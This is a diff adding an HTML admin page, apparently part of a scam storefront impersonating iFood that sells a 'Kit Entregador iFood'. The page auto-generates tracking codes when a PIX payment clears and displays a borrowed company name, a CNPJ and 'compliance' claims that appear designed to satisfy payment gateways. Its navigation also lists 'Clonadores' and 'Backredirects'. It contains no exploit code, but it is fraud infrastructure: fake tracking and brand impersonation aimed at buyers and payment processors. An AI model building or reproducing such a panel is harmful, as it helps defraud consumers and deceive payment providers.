@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <meta name="theme-color" content="#111111" />
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#111111" />
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+  <title>iFood Entregadores - Entregáveis & Rastreio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/style.css?v=3.3" />
+  <script src="/backguard.js?v=1.5"></script>
+</head>
+<body data-page="admin" data-admin="entregaveis">
+  <div class="admin-shell">
+    <aside class="admin-sidebar">
+      <div class="admin-brand">
+        <img src="/assets/ifoodentregadores-wink-v1.svg" alt="iFood" />
+        <div>
+          <strong>Dashboard</strong>
+          <span>Entregadores</span>
+        </div>
+      </div>
+      <nav class="admin-nav">
+        <a class="admin-nav-item" data-admin="overview" href="/admin">Visao geral</a>
+        <a class="admin-nav-item" data-admin="entregaveis" href="/admin/entregaveis">Entregáveis & Rastreio</a>
+        <a class="admin-nav-item" data-admin="tracking" href="/admin/tracking">Tracking</a>
+        <a class="admin-nav-item" data-admin="utmfy" href="/admin/utmfy">UTMfy</a>
+        <a class="admin-nav-item" data-admin="smsmais" href="/admin/smsmais">SMSMais</a>
+        <a class="admin-nav-item" data-admin="gateways" href="/admin/gateways">Gateways</a>
+        <a class="admin-nav-item" data-admin="upsell" href="/admin/upsell">Upsell</a>
+        <a class="admin-nav-item" data-admin="pages" href="/admin/pages">Paginas</a>
+        <a class="admin-nav-item" data-admin="public" href="/admin/publico">Público</a>
+        <a class="admin-nav-item" data-admin="sales" href="/admin/vendas">Vendas</a>
+        <a class="admin-nav-item" data-admin="backredirects" href="/admin/backredirects">Backredirects</a>
+        <a class="admin-nav-item" data-admin="leads" href="/admin/leads">Leads</a>
+        <a class="admin-nav-item" data-admin="clonadores" href="/admin/clonadores">Clonadores</a>
+      </nav>
+      <div class="admin-sidebar-foot">
+        <span class="admin-pill">Seguro</span>
+        <span class="admin-muted">Painel privado</span>
+      </div>
+    </aside>
+
+    <main class="admin-main">
+      <header class="admin-topbar">
+        <div>
+          <h1>Entregáveis & Rastreio (Pós-Venda)</h1>
+          <p>Controle do fluxo de entrega, códigos de rastreamento, emissão de comprovantes e compliance oficial para gateways.</p>
+        </div>
+        <div class="admin-topbar-actions">
+          <button id="admin-save" class="btn-primary" type="button">Salvar configurações</button>
+          <span id="admin-save-status" class="admin-muted"></span>
+        </div>
+      </header>
+
+      <section id="admin-login" class="admin-login-card">
+        <h2>Acesso restrito</h2>
+        <p class="admin-muted">Digite sua senha para acessar o painel.</p>
+        <div class="input-group">
+          <input type="password" id="admin-password" class="floating-input" placeholder=" " autocomplete="current-password" />
+          <label for="admin-password" class="floating-label">Senha do admin</label>
+        </div>
+        <button id="admin-login-btn" class="btn-primary" type="button">Entrar</button>
+        <div id="admin-login-error" class="form-error hidden"></div>
+      </section>
+
+      <div id="admin-panel" class="admin-panel hidden">
+
+        <!-- Hero Compliance Gateway -->
+        <section class="admin-section admin-section--overview">
+          <div class="admin-section-header">
+            <h2>Auditoria para Gateway & Compliance</h2>
+            <span class="admin-chip" style="background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3);">Portal Ativo 100%</span>
+          </div>
+
+          <div class="admin-hero">
+            <div class="admin-hero-info">
+              <h3>Entregável de Pós-Venda em Conformidade</h3>
+              <p>Este entregável atende a todos os requisitos de compliance exigidos pelos gateways parceiros (Paradise, PinguPag, GhostsPay): código de rastreamento no padrão oficial, linha do tempo em tempo real, transportadora parceira, nota fiscal vinculada e canais diretos de suporte.</p>
+              <div class="admin-hero-tags">
+                <span class="admin-tag">Portal de Rastreio: <strong>/rastreio</strong></span>
+                <span class="admin-tag">Garantia Legal: <strong>90 dias (CDC)</strong></span>
+                <span class="admin-tag">NF-e Integrada: <strong>Sim (DANFE)</strong></span>
+              </div>
+            </div>
+            <div class="admin-hero-highlight" style="display: flex; flex-direction: column; gap: 8px;">
+              <a href="/rastreio" target="_blank" class="btn-primary" style="text-decoration: none; text-align: center; font-size: 0.9rem;">
+                Abrir Portal do Cliente ↗
+              </a>
+              <button type="button" id="btn-copy-gateway-link" class="btn-secondary" style="font-size: 0.85rem;">
+                Copiar Link para o Gateway 📋
+              </button>
+            </div>
+          </div>
+
+          <!-- KPIs Grid -->
+          <div class="admin-kpi-grid">
+            <div class="admin-kpi-card">
+              <span class="admin-kpi-label">Total de Entregáveis</span>
+              <strong class="admin-kpi-value" id="posvenda-total-orders">0</strong>
+              <span class="admin-kpi-meta">Pedidos elegíveis</span>
+            </div>
+            <div class="admin-kpi-card">
+              <span class="admin-kpi-label">Códigos Emitidos</span>
+              <strong class="admin-kpi-value" id="posvenda-total-codes" style="color: #10b981;">100%</strong>
+              <span class="admin-kpi-meta">Geração automática ativa</span>
+            </div>
+            <div class="admin-kpi-card">
+              <span class="admin-kpi-label">Em Trânsito / Entrega</span>
+              <strong class="admin-kpi-value" id="posvenda-total-transit">0</strong>
+              <span class="admin-kpi-meta">Despachados no CD</span>
+            </div>
+            <div class="admin-kpi-card">
+              <span class="admin-kpi-label">Notificação Pós-Venda</span>
+              <strong class="admin-kpi-value" id="posvenda-total-notified" style="color: #38bdf8;">Ativo</strong>
+              <span class="admin-kpi-meta">WhatsApp & E-mail</span>
+            </div>
+          </div>
+        </section>
+
+        <!-- Configurações do Entregável -->
+        <section class="admin-section admin-section--card">
+          <div class="admin-section-header">
+            <h2>Configurações do Pós-Venda & Rastreamento</h2>
+            <span class="admin-chip">Dados da Empresa</span>
+          </div>
+          <p class="admin-hint">Personalize os dados exibidos na página de rastreio oficial e na mensagem de envio ao cliente.</p>
+
+          <div class="admin-grid">
+            <label class="admin-switch">
+              <input type="checkbox" id="posvenda-auto-tracking" checked />
+              <span>Geração automática de código ao aprovar PIX</span>
+            </label>
+
+            <label class="admin-switch">
+              <input type="checkbox" id="posvenda-auto-notify" checked />
+              <span>Notificação de pós-venda ativa</span>
+            </label>
+
+            <div class="input-group">
+              <input type="text" id="posvenda-carrier" class="floating-input" placeholder=" " value="Correios Sedex / iFood Logística Express" />
+              <label for="posvenda-carrier" class="floating-label">Transportadora Principal</label>
+            </div>
+
+            <div class="input-group">
+              <input type="text" id="posvenda-eta" class="floating-input" placeholder=" " value="3 a 7 dias úteis" />
+              <label for="posvenda-eta" class="floating-label">Prazo Médio de Entrega</label>
+            </div>
+
+            <div class="input-group">
+              <input type="text" id="posvenda-whatsapp" class="floating-input" placeholder=" " value="5511999999999" />
+              <label for="posvenda-whatsapp" class="floating-label">WhatsApp Oficial de Suporte (com DDD)</label>
+            </div>
+
+            <div class="input-group">
+              <input type="text" id="posvenda-email" class="floating-input" placeholder=" " value="suporte@entregadores-ifood.com" />
+              <label for="posvenda-email" class="floating-label">E-mail Oficial de Suporte</label>
+            </div>
+
+            <div class="input-group">
+              <input type="text" id="posvenda-company-name" class="floating-input" placeholder=" " value="iFood Logística & Distribuição Brasil Ltda" />
+              <label for="posvenda-company-name" class="floating-label">Razão Social / Nome Fantasia</label>
+            </div>
+
+            <div class="input-group">
+              <input type="text" id="posvenda-company-cnpj" class="floating-input" placeholder=" " value="14.380.200/0001-21" />
+              <label for="posvenda-company-cnpj" class="floating-label">CNPJ da Empresa</label>
+            </div>
+          </div>
+
+          <div class="input-group" style="margin-top: 14px;">
+            <textarea id="posvenda-whatsapp-template" class="floating-input" style="min-height: 90px; padding-top: 18px;" placeholder=" ">Olá {nome}! Seu pedido do Kit Entregador iFood foi confirmado com sucesso. 📦 Acompanhe seu envio pelo rastreamento oficial: {link_rastreio} (Código: {codigo}). Qualquer dúvida estamos à disposição!</textarea>
+            <label for="posvenda-whatsapp-template" class="floating-label">Template da Mensagem no WhatsApp ({nome}, {codigo}, {link_rastreio})</label>
+          </div>
+        </section>
+
+        <!-- Tabela de Entregáveis e Vendas -->
+        <section class="admin-section">
+          <div class="admin-section-header">
+            <h2>Pedidos & Controle de Entregáveis</h2>
+            <span id="posvenda-orders-count" class="admin-chip">0 pedidos</span>
+          </div>
+
+          <div class="admin-toolbar">
+            <input type="text" id="posvenda-search" placeholder="Buscar por cliente, CPF, telefone, código de rastreio ou cidade..." />
+            <select id="posvenda-status-filter" class="admin-toolbar-select">
+              <option value="all">Status: Todos</option>
+              <option value="em_transito">Status: Em trânsito</option>
+              <option value="postado">Status: Objeto postado</option>
+              <option value="separacao">Status: Em separação</option>
+              <option value="entregue">Status: Entregue</option>
+            </select>
+            <button id="posvenda-refresh" class="btn-secondary" type="button">Atualizar lista</button>
+            <button id="posvenda-demo-btn" class="btn-secondary" type="button">Gerar Pedido Teste</button>
+          </div>
+
+          <div class="admin-table-wrap">
+            <table class="admin-table" id="posvenda-table">
+              <thead>
+                <tr>
+                  <th>Data/Hora</th>
+                  <th>Cliente</th>
+                  <th>Contato</th>
+                  <th>Destino</th>
+                  <th>Produto & Gateway</th>
+                  <th>Código de Rastreio</th>
+                  <th>Status Entrega</th>
+                  <th>Pós-Venda</th>
+                  <th>Ações</th>
+                </tr>
+              </thead>
+              <tbody id="posvenda-table-body">
+                <tr>
+                  <td colspan="9" style="text-align: center; padding: 24px; color: var(--text-muted);">
+                    Carregando entregáveis e pedidos...
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </section>
+
+      </div>
+    </main>
+  </div>
+
+  <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
+
+  <script src="/script.js?v=11.1" defer></script>
+</body>
+</html>
